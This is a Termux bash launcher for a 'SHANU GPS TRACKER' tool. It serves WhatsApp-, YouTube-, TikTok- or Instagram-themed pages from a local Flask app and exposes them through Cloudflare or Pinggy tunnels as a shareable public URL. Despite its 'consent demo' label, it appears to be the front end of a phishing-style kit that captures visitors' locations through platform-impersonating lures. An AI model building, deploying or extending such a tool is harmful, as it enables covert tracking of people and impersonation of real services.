#!/data/data/com.termux/files/usr/bin/bash

C='\033[1;36m'
G='\033[1;32m'
R='\033[1;31m'
W='\033[1;37m'
X='\033[0m'

cd "$HOME/SHANU-GPS-TRACKER" || exit 1

APP_PID=""
TUNNEL_PID=""
LOG_PID=""
OWN_APP=0

cleanup() {
    [ -n "$LOG_PID" ] && kill "$LOG_PID" 2>/dev/null
    echo
    echo "[+] Stopping launcher..."

    if [ -n "$TUNNEL_PID" ]; then
        kill "$TUNNEL_PID" 2>/dev/null
    fi

    if [ "$OWN_APP" = 1 ] && [ -n "$APP_PID" ]; then
        kill "$APP_PID" 2>/dev/null
    fi
}

trap cleanup EXIT INT TERM

clear
echo -e "${C}===== SHANU GPS SYSTEM =====${X}"
echo "[01] WhatsApp demo"
echo "[02] YouTube demo"
echo "[03] TikTok demo"
echo "[04] Instagram demo"
echo "[99] Exit"

read -rp "Select demo: " choice

case "$choice" in
    1|01) PLATFORM="WhatsApp"; PAGE="whatsapp" ;;
    2|02) PLATFORM="YouTube"; PAGE="youtube" ;;
    3|03) PLATFORM="TikTok"; PAGE="tiktok" ;;
    4|04) PLATFORM="Instagram"; PAGE="instagram" ;;
    99) exit 0 ;;
    *) echo "Invalid selection"; exit 1 ;;
esac

clear
echo -e "${C}===== CONNECTION MODE =====${X}"
echo "[01] Localhost"
echo "[02] Cloudflare HTTPS"
echo "[03] Pinggy HTTPS"
echo "[99] Back"

read -rp "Select connection: " connection

case "$connection" in
    1|01) MODE="local" ;;
    2|02) MODE="cloudflare" ;;
    3|03) MODE="pinggy" ;;
    99) exec "$0" ;;
    *) echo "Invalid selection"; exit 1 ;;
esac

BASE="http://127.0.0.1:8080"

echo "[+] Checking Flask..."

if curl -fsS --max-time 3 "$BASE/" >/dev/null 2>&1; then
    echo "[+] Existing Flask server detected."
else
    echo "[+] Starting Flask..."
    python -u app.py > app.log 2>&1 &
    APP_PID=$!
    OWN_APP=1
    tail -n 0 -F app.log &
    LOG_PID=$!
    APP_PID=$!
    OWN_APP=1

    READY=0
    for i in $(seq 1 20); do
        if curl -fsS --max-time 2 "$BASE/" >/dev/null 2>&1; then
            READY=1
            break
        fi
        sleep 1
    done

    if [ "$READY" != 1 ]; then
        echo "[!] Flask failed to start."
        tail -30 app.log
        exit 1
    fi
fi

URL="$BASE"

if [ "$MODE" = "cloudflare" ]; then
    command -v cloudflared >/dev/null 2>&1 || {
        echo "[!] cloudflared not installed."
        exit 1
    }

    echo "[+] Starting Cloudflare..."
    : > cloudflared.log
    cloudflared tunnel --no-autoupdate --protocol http2 \
        --url "$BASE" > cloudflared.log 2>&1 &
    TUNNEL_PID=$!

    for i in $(seq 1 40); do
        URL=$(grep -oE 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' cloudflared.log | head -1)
        [ -n "$URL" ] && break
        kill -0 "$TUNNEL_PID" 2>/dev/null || break
        sleep 1
    done

elif [ "$MODE" = "pinggy" ]; then
    command -v ssh >/dev/null 2>&1 || {
        echo "[!] OpenSSH not installed."
        exit 1
    }

    echo "[+] Starting Pinggy..."
    : > pinggy.log
    ssh -o ServerAliveInterval=30 \
        -o ServerAliveCountMax=3 \
        -o StrictHostKeyChecking=accept-new \
        -p 443 -R0:127.0.0.1:8080 \
        free.pinggy.io > pinggy.log 2>&1 &
    TUNNEL_PID=$!

    for i in $(seq 1 40); do
        URL=$(grep -oE 'https://[a-zA-Z0-9-]+(\.free\.pinggy\.net|\.run\.pinggy-free\.link)' pinggy.log | head -1)
        [ -n "$URL" ] && break
        kill -0 "$TUNNEL_PID" 2>/dev/null || break
        sleep 1
    done
fi

if [ -z "$URL" ]; then
    echo "[!] Public tunnel URL not detected."
    [ -f pinggy.log ] && tail -20 pinggy.log
    [ -f cloudflared.log ] && tail -20 cloudflared.log
    exit 1
fi

echo
echo -e "${G}===== CONNECTION READY =====${X}"
echo "$URL/$PAGE"
echo
echo "SHANU-branded consent demo."
echo "Location sharing requires explicit user permission."
echo "Keep this terminal open."

if [ -n "$TUNNEL_PID" ]; then
    wait "$TUNNEL_PID"
    echo "[!] Tunnel process disconnected."
else
    while true; do
        sleep 5
        if ! curl -fsS --max-time 3 "$BASE/" >/dev/null 2>&1; then
            echo "[!] Flask server stopped."
            break
        fi
    done
fi
